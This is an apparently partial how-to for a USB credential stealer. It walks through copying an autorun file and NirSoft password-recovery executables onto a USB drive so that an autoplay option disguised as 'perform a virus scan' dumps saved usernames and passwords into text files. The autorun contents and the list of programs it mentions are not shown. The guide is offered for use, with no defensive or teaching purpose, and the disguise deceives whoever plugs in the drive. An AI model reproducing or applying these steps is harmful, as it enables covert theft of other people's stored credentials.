copy the autorun and launch file to your USB

go to http://www.nirsoft.net/ and download the programs named in step 2

extract the files you downloaded to your desktop and copy all the .exe files to your USB
remove and re-insert your USB

click on the option perform a virus scan
(this is an example, if you want it to say something else go to the autorun file and change it ;) )
go to my computer—-> USB DRIVE and open it
you will now see some text files, if you open them you will see usernames and passwords
NOTICE: this only recovers passwords that have once been saved on your computer
